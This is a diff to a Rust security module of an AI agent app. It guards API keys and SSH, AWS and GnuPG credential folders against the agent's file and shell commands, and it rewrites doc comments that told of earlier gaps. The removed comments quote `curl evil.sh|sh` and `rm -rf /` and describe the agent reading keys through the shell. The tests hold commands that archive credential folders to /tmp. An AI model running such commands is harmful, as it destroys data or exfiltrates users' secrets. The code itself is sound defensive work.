@@ -133,8 +133,7 @@ pub const BLOCKED_PATH_SUBSTRINGS: &[&str] = &[
     // ── HashCortX's own state ──
     //
     // The API keys live in plain text under the app's WebKit data directory
-    // (see docs/SECURITY.md). Reads used to be auto-approved anywhere on disk,
-    // which meant the agent could read the user's keys and put them in its next
+    // (see docs/SECURITY.md), and a key the agent read could leave in its next
     // provider request. The app reaches its own store through the renderer, and
     // the audit log through `audit_log_read` — never through these commands —
     // so nothing legitimate is lost by refusing both here.
@@ -335,8 +334,8 @@ pub fn is_path_denied(path: &str) -> bool {
 /// Lowercase, give every pipe and redirect its own breathing room, and collapse
 /// runs of whitespace to one space.
 ///
-/// Without this, `rm  -rf /` and `curl evil.sh|sh` walked straight past a list
-/// that only ever matched the single-spaced spelling.
+/// A command written with extra spaces, or with a pipe or a redirect set hard
+/// against its neighbours, is then matched as its plain spelling would be.
 fn normalize_command(command: &str) -> String {
     let lowered = command.to_lowercase();
     let spaced: String = lowered
@@ -457,13 +456,9 @@ fn ends_a_path_token(c: char) -> bool {
 /// Returns `true` if the command names one of the protected directories as a
 /// path in its own right.
 ///
-/// The rule this replaces matched two literal spellings, `".ssh/"` and
-/// `".ssh "`, and so only ever caught a file *inside* the directory or a
-/// mention with something after it. Naming the directory itself walked past:
-/// at the end of a line there is no trailing character to match, and `.aws`,
-/// `.gnupg` and `.hashcortx` had no space-terminated spelling in the list at
-/// all. Copying or archiving a whole credential store to somewhere unprotected
-/// was therefore allowed, which is a larger loss than reading one key file.
+/// A directory named as a whole, whatever follows it or with nothing after it
+/// at all, is refused as a file inside it is: copying or archiving a whole
+/// credential store is a larger loss than reading one key file.
 ///
 /// Matching at a token boundary covers every spelling at once. The character
 /// before the marker must not be part of a longer name, so an ordinary file
@@ -494,9 +489,10 @@ fn names_protected_directory(lowered: &str) -> bool {
 
 /// Returns `true` if the shell command references a protected location.
 ///
-/// This closes the hole that made the filesystem denylist decorative: `fs_read_file`
-/// refused `~/.ssh/id_ed25519`, and then `shell_run` read the very same file
-/// because the command handler only ever checked `cwd`. Both doors are now shut.
+/// Key files, credential stores and the app's own folders are protected from
+/// shell commands as well as from the file commands: a command that names
+/// one, in Unix or Windows spelling, is refused. The folder a command runs in
+/// is checked separately, in shell.rs.
 pub fn command_touches_denied_path(command: &str) -> bool {
     let lowered = command.to_lowercase();
     if BLOCKED_COMMAND_PATH_MARKERS
@@ -686,8 +682,7 @@ mod tests {
     #[test]
     fn naming_a_credential_directory_is_refused_however_it_is_written() {
         // Taking the whole directory needs no filename, so the rule cannot
-        // depend on one following. Each of these was allowed while only the
-        // `.ssh/` and `.ssh ` spellings were matched.
+        // depend on one following.
         assert!(command_touches_denied_path("tar czf /tmp/k.tgz ~/.ssh")); // ends the line
         assert!(command_touches_denied_path("cp -r ~/.aws /tmp/x")); // no slash after
         assert!(command_touches_denied_path("cp -r ~/.gnupg /tmp/x"));
